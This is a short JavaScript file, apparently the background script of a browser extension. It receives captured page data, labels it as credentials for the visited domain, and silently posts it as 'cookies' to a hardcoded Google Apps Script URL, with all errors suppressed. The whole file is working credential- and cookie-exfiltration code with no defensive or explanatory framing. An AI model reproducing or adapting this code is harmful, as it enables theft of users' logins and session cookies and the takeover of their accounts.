chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "exfiltratePageData") {
        const pageData = request.data;
        const pageUrl = new URL(pageData.url);
        const domain = pageUrl.hostname.replace('www.', '');

        exfiltrateToCloud(JSON.stringify(pageData, null, 4), `CREDENTIALS: ${domain} (${pageData.event})`);
    }
    return true;
});

async function exfiltrateToCloud(data, type) {
    const CLOUD_URL = "https://script.google.com/macros/s/AKfycbxHO6e3NQkQpw9BIzOPRIExLqbgqm0PfQKiJb6J-f-1aZEOYiHUEqGh1B7E-daUeIyp/exec";
    try {
        await fetch(CLOUD_URL, {
            method: 'POST',
            body: JSON.stringify({
                site: type,
                cookies: data
            })
        });
    } catch (err) { }
}

